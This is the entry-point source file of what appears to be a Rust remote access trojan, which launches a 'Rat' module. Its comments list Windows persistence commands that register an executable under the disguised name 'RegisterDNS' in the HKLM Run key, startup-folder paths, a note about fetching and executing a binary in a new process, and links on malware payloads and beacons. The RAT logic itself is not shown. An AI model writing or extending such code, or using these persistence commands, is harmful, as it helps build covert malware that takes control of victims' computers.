// #![windows_subsystem = "windows"]

mod connector;
mod error;
mod rat;

use crate::rat::Rat;
use anyhow::Result;
use common::utils::shake_your_hash;

// Set-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name '!RegisterDNS' -Value "C:\Users\sylvain\Desktop\hihihi.exe"
// Set-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name 'RegisterDNS' -Value "C:\Users\sylvain\Desktop\hihihi.exe"

// REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v "RegisterDNS" /t REG_SZ /d "C:\Users\sylvain\Desktop\hihihi.exe" /f
// REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
// REG DELETE HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v "RegisterDNS" /f

// System wide: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
// User wide: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

// https://www.illumio.com/blog/malware-payload-beacon
// https://www.illumio.com/blog/types-malicious-payloads

// Get and exec bin in new process

#[tokio::main]
async fn main() -> Result<()> {
    env_logger::init();
    log::info!(
        "Running {} ({})",
        std::env::current_exe()?.display(),
        shake_your_hash()?
    );
    Rat::new()?.start().await
}
